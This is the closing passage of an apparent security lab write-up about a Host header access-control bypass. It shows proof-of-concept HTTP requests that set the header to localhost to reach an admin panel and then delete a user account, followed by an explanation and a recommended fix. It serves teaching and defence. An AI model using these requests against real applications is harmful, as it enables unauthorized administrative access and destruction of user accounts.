## 10. Proof of Concept

The vulnerability can be reproduced with the following request:

```http
GET /admin HTTP/2
Host: localhost
```

After obtaining access to the administration panel:

```http
GET /admin/delete?username=carlos HTTP/2
Host: localhost
```

The second request successfully deletes the target account.

---

## 11. Conclusion

The application relied on the client-controlled `Host` header to determine whether a request originated from a trusted local environment.

By changing:

```http
Host: <lab-domain>
```

to:

```http
Host: localhost
```

the access-control mechanism was bypassed and the administrative panel became accessible.

The vulnerability demonstrates why HTTP headers supplied by clients must not be trusted for authorization decisions. Proper server-side authentication and authorization controls should be implemented independently of the `Host` header.
